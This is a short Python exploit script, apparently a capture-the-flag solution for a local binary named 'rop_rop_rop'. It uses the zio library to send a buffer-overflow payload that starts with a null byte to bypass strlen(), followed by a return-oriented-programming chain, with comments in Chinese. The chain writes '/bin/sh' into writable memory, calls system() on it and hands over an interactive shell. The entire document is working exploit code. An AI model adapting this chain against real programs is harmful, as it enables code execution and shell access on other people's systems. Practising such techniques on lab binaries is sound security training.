#!/usr/bin/env python
# encoding:utf-8

import zio

payload = "A" * 7 + "\x00" # 使用 0x00 绕过 strlen()
payload += "@" * 8 # 
payload += zio.l32(0x80485F2) # GetUserInput() 的地址
payload += zio.l32(0x804886B) # pop, ret 的地址
payload += zio.l32(0x804A04C) # GetUserInput() 的参数 (在内存中找一段可写的地址 , 用来存放 /bin/sh 这个字符串)
payload += zio.l32(0x8048480) # GetUserInput() 的返回地址 , 也就是 system 函数的地址
payload += zio.l32(0x804886B) # pop, ret 的地址
payload += zio.l32(0x804A04C) # system() 函数的参数 , 为 /bin/sh 这个字符串的地址
payload += zio.l32(0x8048490) # exit() 函数的地址
payload += "\x00" * 4 # exit() 的返回地址 (程序已经结束就不必再关心)
payload += zio.l32(0x00) # exit() 的参数 , 0

Io = zio.zio("./rop_rop_rop")
Io.writeline(payload)
Io.readline()
Io.writeline("/bin/sh")
Io.interact()
